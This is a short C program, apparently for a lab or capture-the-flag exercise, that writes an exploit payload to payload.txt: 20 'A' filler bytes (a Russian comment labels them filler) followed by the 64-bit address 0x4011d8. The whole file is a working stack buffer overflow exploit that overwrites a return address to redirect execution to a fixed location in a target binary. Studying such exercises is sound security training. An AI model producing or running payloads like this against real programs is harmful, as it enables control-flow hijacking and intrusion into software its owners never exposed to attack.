#include <stdio.h>
#include <stdint.h>

int main() {
    FILE *f = fopen("payload.txt", "wb");
    
    /*20 байт филлера */ 
    for (int i = 0; i < 20; i++) {
        fputc('A', f);
    }
    
    uint64_t address = 0x4011d8;
    fwrite(&address, 8, 1, f);
    
    fclose(f);
   
    return 0;
}